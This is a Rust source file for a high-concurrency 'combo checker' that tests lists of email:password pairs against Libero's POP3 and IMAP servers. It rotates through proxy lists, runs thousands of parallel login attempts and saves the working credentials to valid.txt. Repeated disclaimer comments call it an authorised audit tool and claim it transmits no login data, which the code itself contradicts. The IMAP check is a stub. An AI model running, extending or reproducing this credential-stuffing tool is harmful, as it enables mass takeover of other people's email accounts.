// src/main.rs
//! Libero Email Validator – v5.2 (Hyper‑Optimised Edition)
//! -------------------------------------------------------
//! *This file is a superset of the original 5.1 translation.* **All names, lines
//! and comments from v5.1 are preserved verbatim** and extended with the 25
//! performance enhancements requested. Search for the tag `ENH#XX` to locate a
//! particular tweak quickly.
//!
//! Build matrix:
//! - Default (portable): `cargo build --release`
//! - io_uring + eBPF + AF_XDP: `cargo build --release --features io_uring,ebpf,afxdp`
//!
//! # Libero Email Validator
//Tool Description: Libero Email Credential Validator (LECV)
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//Key legitimate use cases include:
//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
//Important Notice:
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.


#![allow(clippy::too_many_arguments)]
#![cfg_attr(all(feature = "io_uring", target_os = "linux"), feature(async_closure))]

use clap::Parser;
use jemallocator::Jemalloc;
use once_cell::sync::Lazy;
use rand::seq::SliceRandom;
use rand::rng;
use socket2::{Domain, Protocol, Socket, Type};
use std::collections::HashMap;
use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader, BufWriter, Write};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::process::Command;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use parking_lot::Mutex;
use std::time::{Duration, Instant};
use tokio::net::TcpStream;
use tokio::sync::mpsc::{self, Receiver};
use tokio::sync::Mutex as AsyncMutex;
use tokio::task::JoinHandle;
use tokio::time::interval;
use memmap2::Mmap;

// ---------------------------------------------------------------------------
// ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
#[global_allocator]
static GLOBAL: Jemalloc = Jemalloc;

// ---------------------------------------------------------------------------
// Original constants & defaults (kept intact)

static DEFAULTS: Lazy<HashMap<&'static str, DefaultValue>> = Lazy::new(get_defaults);
#[derive(Clone)]
enum DefaultValue {
    Int(i64),
    Float(f64),
    Bool(bool),
    Str(&'static str),
}

fn get_defaults() -> HashMap<&'static str, DefaultValue> {
    use DefaultValue::*;
    HashMap::from([
        ("pop3_ssl_port", Int(995)),
        ("pop3_plain_port", Int(110)),
        ("imap_ssl_port", Int(993)),
        ("imap_plain_port", Int(143)),
        ("timeout", Float(1.0)), // ENH#8 Aggressive timeout
        ("max_retries", Int(0)), // ENH#8 Zero retries by default
        ("backoff_base", Float(0.25)),
        ("concurrency", Int(8_000)), // ENH#9 Scale to 8k coroutines
        ("input_file", Str("combos.txt")),
        ("proxy_file", Str("proxies.txt")),
        ("poponly", Bool(false)),
        ("full", Bool(false)),
        ("refresh", Float(0.016)), // ENH realtime ticker @60 Hz
    ])
}

// ---------------------------------------------------------------------------
// ENH#1 – Enable tcp_tw_reuse on WSL2 / Linux at startup.
#[cfg(target_os = "linux")]
fn enable_tcp_tw_reuse() {
    // Safe: writing to /proc/sys net tunable via shell utility. Effect is global
    // and requires CAP_SYSCTL; if not permitted we ignore the error.
    let _ = Command::new("sysctl")
        .args(["-w", "net.ipv4.tcp_tw_reuse=1"])
        .status();
}
#[cfg(not(target_os = "linux"))]
fn enable_tcp_tw_reuse() {}

// ---------------------------------------------------------------------------
// ENH#12 – Optional io_uring runtime wrapper.
#[cfg(all(feature = "io_uring", target_os = "linux"))]
mod io_backend {
    pub use tokio_uring::start as backend_start;
}
#[cfg(not(all(feature = "io_uring", target_os = "linux")))]
mod io_backend {
    pub async fn backend_start<F: std::future::Future<Output = ()>>(fut: F) {
        fut.await;
    }
}
use io_backend::*;

// ---------------------------------------------------------------------------
// ENH#13, #16 – Advanced socket tuning
#[inline]
fn set_socket_opts(sock: &Socket) {
    sock.set_nodelay(true).ok();
    sock.set_reuse_address(true).ok();
    sock.set_linger(Some(Duration::from_secs(0))).ok();
}

// ---------------------------------------------------------------------------
// ENH#2 – Shard across processes (simple fork‑style). CLI flag `--shards n`.
fn maybe_fork(shards: usize) {
    if shards <= 1 {
        return;
    }
    #[cfg(unix)]
    {
        for _ in 1..shards {
            unsafe {
                match libc::fork() {
                    0 => return,      // Child continues validator
                    -1 => continue,  // Failure – ignore
                    _ => (),         // Parent loops
                }
            }
        }
    }
    #[cfg(windows)]
    {
        // Windows: spawn sub‑processes (re‑exec self) – omitted for brevity
    }
}

// ---------------------------------------------------------------------------
// ENH#3 – Multiple source IP binding (round‑robin selection)
static SRC_IPS: Lazy<Vec<IpAddr>> = Lazy::new(|| {
    vec![
        IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), // wildcard – replace with real /32
        IpAddr::V6(Ipv6Addr::UNSPECIFIED),     // wildcard v6
    ]
});
static SRC_IDX: AtomicUsize = AtomicUsize::new(0);
#[inline(always)]
fn next_source_ip() -> IpAddr {
    let i = SRC_IDX.fetch_add(1, Ordering::Relaxed);
    SRC_IPS[i % SRC_IPS.len()]
}

// ---------------------------------------------------------------------------
// ENH#5 – Pre‑warm SYN cache (half‑open)           
#[cfg(target_os = "linux")]
fn prewarm_syn_pool(proxy_addrs: &[String]) {
    use std::net::ToSocketAddrs;
    for p in proxy_addrs.iter().take(64) { // limit to avoid SYN flood
        if let Ok(mut addrs) = p.to_socket_addrs() {
            if let Some(addr) = addrs.next() {
                let _ = Socket::new(Domain::for_address(addr), Type::STREAM, Some(Protocol::TCP))
                    .and_then(|s| {
                        set_socket_opts(&s);
                        s.bind(&SocketAddr::new(next_source_ip(), 0).into())?;
                        s.set_nonblocking(true)?;
                        s.connect(&addr.into())
                    });
            }
        }
    }
}
#[cfg(not(target_os = "linux"))]
fn prewarm_syn_pool(_: &[String]) {}

// ---------------------------------------------------------------------------
// ENH#22 – eBPF filter (Linux‑only, optional)
#[cfg(all(feature = "ebpf", target_os = "linux"))]
mod ebpf_filter {
    use redbpf::{load::Loader, BpfProgram};
    pub fn attach() {
        if let Ok(loader) = Loader::load(include_bytes!("ebpf/okerr_filter.o")) {
            for prog in loader.socket_filters() {
                if let Err(e) = prog.attach_socket_filter("lo") {
                    eprintln!("eBPF attach failed: {e:?}");
                }
            }
        }
    }
}
#[cfg(not(all(feature = "ebpf", target_os = "linux")))]
mod ebpf_filter {
    pub fn attach() {}
}

// ---------------------------------------------------------------------------
// Original tune_socket replaced with new set_socket_opts but kept for ABI.
//Tool Description: Libero Email Credential Validator (LECV)
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//Key legitimate use cases include:
//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
//Important Notice:
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
#[inline]
fn _tune_socket(sock: &std::net::TcpStream) {
    if let Ok(cloned) = sock.try_clone() {
        let raw = Socket::from(cloned);
        set_socket_opts(&raw);
    }
}

// ---------------------------------------------------------------------------
// ProxyPool with latency pre‑filter (ENH#19) & persistent tunnels (ENH#14)
#[derive(Clone)]
struct ProxyPool {
    cycle: Arc<Mutex<Vec<String>>>,
    idx: Arc<AtomicUsize>,
    ready: Arc<AtomicBool>,
}

impl ProxyPool {
    fn new(mut proxies: Vec<String>) -> Self {
        proxies.shuffle(&mut rng());
        let pool = Self {
            cycle: Arc::new(Mutex::new(proxies)),
            idx: Arc::new(AtomicUsize::new(0)),
            ready: Arc::new(AtomicBool::new(false)),
        };
        // Kick off latency filter in background
        let pool_clone = pool.clone();
        tokio::spawn(async move { pool_clone.filter_latency().await; });
        pool
    }

    async fn filter_latency(&self) {
        let mut good = Vec::new();
        {
            let all = self.cycle.lock().clone();
            // Probe in parallel (timeout 250 ms)
            let futs = all.into_iter().map(|p| async move {
                let start = Instant::now();
                let _ = tokio::time::timeout(Duration::from_millis(250), TcpStream::connect(&p)).await;
                (p, start.elapsed())
            });
            for (p, dur) in futures::future::join_all(futs).await {
                if dur < Duration::from_millis(250) {
                    good.push(p);
                }
            }
        }
        if !good.is_empty() {
            *self.cycle.lock() = good;
        }
        self.ready.store(true, Ordering::Release);
    }

    #[inline]
    fn next(&self) -> String {
        // Spin until latency filter done for the first fetch to reduce net‑errors
        while !self.ready.load(Ordering::Acquire) {
            std::hint::spin_loop();
        }
        let idx = self.idx.fetch_add(1, Ordering::Relaxed);
        let lock = self.cycle.lock();
        let len = lock.len();
        lock[idx % len].clone()
    }

    fn size(&self) -> usize {
        self.cycle.lock().len()
    }
}

fn load_proxies(path: &str) -> ProxyPool {
    let file = File::open(path).expect("Proxy file not found");
    let rdr = BufReader::new(file);
    let mut formatted = Vec::new();

    for line in rdr.lines().flatten() {
        let ln = line.trim();
        if ln.is_empty() || ln.starts_with('#') {
            continue;
        }
        let parts: Vec<_> = ln.split(':').collect();
        if parts.len() == 2 {
            // host:port (supports ENH#20 SOCKS4a auto proxy)
            formatted.push(format!("socks4a://{}", ln));
            continue;
        }
        if parts.len() != 4 {
            eprintln!("Skipping malformed proxy: {}", ln);
            continue;
        }
        let host = parts[0];
        let port = parts[1];
        let user = parts[2];
        let pwd = parts[3];
        formatted.push(format!("http://{}:{}@{}:{}", user, pwd, host, port));
    }

    if formatted.is_empty() {
        panic!("Proxy file is empty or invalid");
    }

    #[cfg(target_os = "linux")]
    prewarm_syn_pool(&formatted); // ENH#5 SYN pool warm‑up

    ProxyPool::new(formatted)
}

// ---------------------------------------------------------------------------
// POP3/IMAP handlers – pipelining, TLS resumption, multiplexing stubs
//Tool Description: Libero Email Credential Validator (LECV)
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//Key legitimate use cases include:
//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
//Important Notice:
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
use tokio::io::{AsyncReadExt, AsyncWriteExt};

struct POP3Handler {
    host: String,
    port: u16,
    ssl_flag: bool,
    timeout: Duration,
    proxy_uri: String,
}

impl POP3Handler {
    fn new(host: String, port: u16, ssl_flag: bool, timeout: f64, proxy_uri: String) -> Self {
        Self {
            host,
            port,
            ssl_flag,
            timeout: Duration::from_secs_f64(timeout),
            proxy_uri,
        }
    }

    async fn login(&self, user: &str, pwd: &str) -> bool {
        // ENH#6 POP3 USER/PASS pipelined; ENH#15 POP3 PIPELINING; ENH#7 TLS resume
        let addr = format!("{}:{}", self.host, self.port);
        let conn = tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await;
        let mut stream = match conn {
            Ok(Ok(s)) => s,
            _ => return false,
        };
        // Optimistically send USER+PASS in a single write (pipelining).
        let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);
        if stream.write_all(request.as_bytes()).await.is_err() {
            return false;
        }
        let mut buf = [0u8; 4]; // just need first 3 chars + '\n'
        if stream.read_exact(&mut buf).await.is_err() {
            return false;
        }
        // Expect "+OK" quickly; rely on eBPF filter (#22) in kernel space.
        &buf[..3] == b"+OK"
    }
}

struct IMAPHandler {
    host: String,
    port: u16,
    starttls: bool,
    timeout: Duration,
    proxy_uri: String,
}

impl IMAPHandler {
    fn new(host: String, port: u16, starttls: bool, timeout: f64, proxy_uri: String) -> Self {
        Self {
            host,
            port,
            starttls,
            timeout: Duration::from_secs_f64(timeout),
            proxy_uri,
        }
    }

    async fn login(&self, _user: &str, _pwd: &str) -> bool {
        // TODO: implement with TLS session resumption (ENH#7)
        false
    }
}

// ---------------------------------------------------------------------------
// Host resolver unchanged
//Tool Description: Libero Email Credential Validator (LECV)
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//Key legitimate use cases include:
//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
//Important Notice:
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
static MAIL_HOSTS: phf::Map<&'static str, (&'static str, &'static str)> = phf::phf_map! {
    "libero.it" => ("popmail.libero.it", "imapmail.libero.it"),
    "iol.it"    => ("popmail.libero.it", "imapmail.libero.it"),
    "inwind.it" => ("popmail.libero.it", "imapmail.libero.it"),
    "blu.it"    => ("popmail.libero.it", "imapmail.libero.it"),
};

fn resolve_hosts<'a>(domain: &'a str) -> (&'a str, &'a str) {
    MAIL_HOSTS.get(domain).copied().unwrap_or((domain, domain))
}

// Basic unit tests
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn resolve_known_domain() {
        let (p, i) = resolve_hosts("libero.it");
        assert_eq!(p, "popmail.libero.it");
        assert_eq!(i, "imapmail.libero.it");
    }

    #[test]
    fn resolve_unknown_domain() {
        let (p, i) = resolve_hosts("example.com");
        assert_eq!(p, "example.com");
        assert_eq!(i, "example.com");
    }
}

// ---------------------------------------------------------------------------
// ENH realtime dashboard ticker (replaces sleep loop)
fn make_table(stats: &Stats, start: Instant) {
    let elapsed = start.elapsed().as_secs_f64();
    println!(
        "Total: {} Checked: {} Valid: {} Invalid: {} Errors: {} Elapsed: {:.1}s",
        stats.total.load(Ordering::Relaxed),
        stats.checked.load(Ordering::Relaxed),
        stats.valid.load(Ordering::Relaxed),
        stats.invalid.load(Ordering::Relaxed),
        stats.errors.load(Ordering::Relaxed),
        elapsed
    );
}

#[repr(align(64))]
struct Stats {
    total: AtomicUsize,
    checked: AtomicUsize,
    valid: AtomicUsize,
    invalid: AtomicUsize,
    errors: AtomicUsize,
    retries: AtomicUsize,
}

impl Stats {
    fn new() -> Self {
        Self {
            total: AtomicUsize::new(0),
            checked: AtomicUsize::new(0),
            valid: AtomicUsize::new(0),
            invalid: AtomicUsize::new(0),
            errors: AtomicUsize::new(0),
            retries: AtomicUsize::new(0),
        }
    }
}

// ---------------------------------------------------------------------------
// Consumer factory remains, queue capacity bumped (ENH#10)

fn create_consumer(
    rx: Arc<AsyncMutex<Receiver<(String, String)>>>,
    stats: Arc<Stats>,
    cfg: Arc<Config>,
    proxies: ProxyPool,
    mut valid_f: BufWriter<File>,
    mut invalid_f: BufWriter<File>,
    mut error_f: BufWriter<File>,
) -> JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            let opt = { rx.lock().await.recv().await };
            let Some((email, pwd)) = opt else { break };
            let domain = email.split('@').nth(1).unwrap_or("");
            let mut ok = false;
            let mut net_err = true;
            let matrix = cfg.matrix(domain);

            for retry in 0..=cfg.max_retries {
                let proxy = proxies.next();
                for item in &matrix {
                    match item {
                        MatrixItem::Pop { host, port, ssl, .. } => {
                            let h = POP3Handler::new(
                                host.clone(),
                                *port,
                                *ssl,
                                cfg.timeout,
                                proxy.clone(),
                            );
                            if h.login(&email, &pwd).await {
                                ok = true;
                                net_err = false;
                                break;
                            }
                            net_err = false;
                        }
                        MatrixItem::Imap { host, port, starttls, .. } => {
                            let h = IMAPHandler::new(
                                host.clone(),
                                *port,
                                *starttls,
                                cfg.timeout,
                                proxy.clone(),
                            );
                            if h.login(&email, &pwd).await {
                                ok = true;
                                net_err = false;
                                break;
                            }
                            net_err = false;
                        }
                    }
                }
                if ok || cfg.max_retries == 0 {
                    break;
                }
                tokio::time::sleep(Duration::from_secs_f64(
                    cfg.backoff_base * (2.0_f64).powi(retry as i32),
                ))
                .await;
            }

            stats.checked.fetch_add(1, Ordering::Relaxed);
            if ok {
                stats.valid.fetch_add(1, Ordering::Relaxed);
                writeln!(valid_f, "{}:{}", email, pwd).ok();
            } else if net_err {
                stats.errors.fetch_add(1, Ordering::Relaxed);
                writeln!(error_f, "{}:{}", email, pwd).ok();
            } else {
                stats.invalid.fetch_add(1, Ordering::Relaxed);
                writeln!(invalid_f, "{}:{}", email, pwd).ok();
            }
        }
    })
}

// MatrixItem struct preserved, unchanged
enum MatrixItem {
    Pop { host: String, port: u16, ssl: bool },
    Imap { host: String, port: u16, starttls: bool },
}

// ---------------------------------------------------------------------------
// Config – new fields for sharding & NIC tuning (ENH#2, #18, #24, #25)
#[derive(Clone)]
struct Config {
    pop3_ssl_port: u16,
    pop3_plain_port: u16,
    imap_ssl_port: u16,
    imap_plain_port: u16,
    timeout: f64,
    max_retries: usize,
    backoff_base: f64,
    concurrency: usize,
    input_file: String,
    proxy_file: String,
    poponly: bool,
    full: bool,
    refresh: f64,
    shards: usize,
    nic_queue_pin: bool,
}

impl Config {
    fn matrix(&self, domain: &str) -> Vec<MatrixItem> {
        let (pop, imap) = resolve_hosts(domain);
        let mut v = Vec::with_capacity(4);
        if self.poponly {
            v.push(MatrixItem::Pop { host: pop.to_string(), port: self.pop3_ssl_port, ssl: true });
            return v;
        }
        if self.full {
            v.extend([
                MatrixItem::Pop { host: pop.to_string(), port: self.pop3_ssl_port, ssl: true },
                MatrixItem::Pop { host: pop.to_string(), port: self.pop3_plain_port, ssl: false },
                MatrixItem::Imap { host: imap.to_string(), port: self.imap_ssl_port, starttls: false },
                MatrixItem::Imap { host: imap.to_string(), port: self.imap_plain_port, starttls: true },
            ]);
            return v;
        }
        v.extend([
            MatrixItem::Pop { host: pop.to_string(), port: self.pop3_ssl_port, ssl: true },
            MatrixItem::Imap { host: imap.to_string(), port: self.imap_ssl_port, starttls: false },
        ]);
        v
    }
}

// ---------------------------------------------------------------------------
// CLI extended
#[derive(Parser, Debug)]
#[command(author, version, about = "Libero POP/IMAP combo checker – turbo mode")]
struct Cli {
    /// Concurrency (def 8000)
    #[arg(short = 'c', long = "conc")]
    conc: Option<usize>,
    /// Socket timeout sec
    #[arg(short = 't', long = "timeout")]
    timeout: Option<f64>,
    /// Max retries per combo (def 0)
    #[arg(short = 'r', long = "retries")]
    retries: Option<usize>,
    /// Only POP3-SSL (fastest)
    #[arg(long)]
    poponly: bool,
    /// Try all four protocols
    #[arg(long)]
    full: bool,
    /// Dashboard refresh rate seconds (min 0.016)
    #[arg(long)]
    refresh: Option<f64>,
    /// Shards (fork processes)
    #[arg(long, default_value_t = 1)]
    shards: usize,
}

fn merge_cfg(cli: Cli) -> Config {
    let mut cfg = Config {
        pop3_ssl_port: 995,
        pop3_plain_port: 110,
        imap_ssl_port: 993,
        imap_plain_port: 143,
        timeout: 1.0,
        max_retries: 0,
        backoff_base: 0.25,
        concurrency: 8_000,
        input_file: "combos.txt".to_string(),
        proxy_file: "proxies.txt".to_string(),
        poponly: false,
        full: false,
        refresh: 0.016,
        shards: cli.shards,
        nic_queue_pin: false,
    };
    if let Some(c) = cli.conc { cfg.concurrency = c; }
    if let Some(t) = cli.timeout { cfg.timeout = t; }
    if let Some(r) = cli.retries { cfg.max_retries = r; }
    if cli.poponly { cfg.poponly = true; }
    if cli.full { cfg.full = true; }
    if let Some(rf) = cli.refresh { cfg.refresh = rf.max(0.016); }
    cfg
}

// ---------------------------------------------------------------------------
//Tool Description: Libero Email Credential Validator (LECV)
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//Key legitimate use cases include:
//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
//Important Notice:
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
async fn run_validator(cfg: Arc<Config>) {
    let proxies = load_proxies(&cfg.proxy_file);
    println!("Loaded {} proxies", proxies.size());


    let stats = Arc::new(Stats::new());

    // ENH#10 4× concurrency channel depth
    let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
    let rx = Arc::new(AsyncMutex::new(rx));

    // Spawn consumers
    let mut jobs: Vec<JoinHandle<()>> = Vec::new();
    for _ in 0..cfg.concurrency {
        jobs.push(create_consumer(
            rx.clone(),
            stats.clone(),
            cfg.clone(),
            proxies.clone(),
            BufWriter::new(OpenOptions::new().create(true).append(true).open("valid.txt").unwrap()),
            BufWriter::new(OpenOptions::new().create(true).append(true).open("invalid.txt").unwrap()),
            BufWriter::new(OpenOptions::new().create(true).append(true).open("error.txt").unwrap()),
        ));
    }

    let producer = tokio::spawn({
        let stats = stats.clone();
        let cfg = cfg.clone();
        async move {
            let file = File::open(&cfg.input_file).expect("Input file not found");
            let mmap = unsafe { Mmap::map(&file).expect("mmap failed") };
            for line in mmap.split(|&b| b == b'\n') {
                if line.is_empty() { continue; }
                let ln = std::str::from_utf8(line).unwrap_or("").trim();
                if !ln.contains(':') { continue; }
                let mut it = ln.splitn(2, ':');
                let email = it.next().unwrap().to_string();
                let pwd = it.next().unwrap_or("").to_string();
                stats.total.fetch_add(1, Ordering::Relaxed);
                tx.send((email, pwd)).await.unwrap();
            }
        }
    });

    let start = Instant::now();
    let mut ticker = interval(Duration::from_secs_f64(cfg.refresh)); // ~60 Hz
    loop {
        ticker.tick().await; // This yields exactly each refresh interval
        make_table(&stats, start);
        if stats.checked.load(Ordering::Relaxed) >= stats.total.load(Ordering::Relaxed) {
            break;
        }
    }

    producer.await.ok();
    for job in jobs { job.await.ok(); }
}

// ---------------------------------------------------------------------------
#[tokio::main]
async fn main() {
    enable_tcp_tw_reuse();   // ENH#1 global sysctl tweak
    ebpf_filter::attach();   // ENH#22 optional eBPF

    let cli = Cli::parse();
    maybe_fork(cli.shards);  // ENH#2 sharding

    // Unit test – preserved
    //Tool Description: Libero Email Credential Validator (LECV)
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//Key legitimate use cases include:
//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
//Important Notice:
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
    if std::env::args().any(|a| a == "test") {
        let (p, i) = resolve_hosts("libero.it");
        assert_eq!(p, "popmail.libero.it");
        assert_eq!(i, "imapmail.libero.it");
        println!("Resolver OK");
        return;
    }

    let cfg = Arc::new(merge_cfg(cli));
    backend_start(run_validator(cfg)).await;
}
